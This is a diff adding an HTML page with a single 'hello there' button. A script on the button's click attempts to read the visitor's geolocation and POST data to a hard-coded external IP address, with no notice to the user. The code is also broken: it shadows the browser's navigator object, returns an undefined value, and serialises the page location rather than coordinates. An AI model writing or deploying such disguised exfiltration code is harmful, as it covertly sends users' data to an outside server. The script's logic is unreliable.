@@ -1,0 +1,47 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    
+<button>hello there</button>
+
+
+</head>
+<body>
+
+    <script defer>
+        const button = document.querySelector('button');
+
+     let navigator =  function result(location) {
+             location = new Promise ((resolve,reject) => {
+            navigator.geolocation.getCurrentPosition((succes,fail) => {
+                resolve(succes);
+            })
+            
+        })
+        return resolve;
+        }
+       
+
+
+        function fetchit() {
+            navigator().then((data) => {
+                console.log(data)
+            }).then(() => {
+                fetch('https://172.104.177.131:8000', {
+                headers: {'Content-type': 'application/json'},
+                method: 'POST',
+                body: JSON.stringify(location)
+            })
+            
+            })
+          
+        }
+
+        button.addEventListener('click',fetchit )
+
+
+
+    </script>
+    
+</body>
+</html>
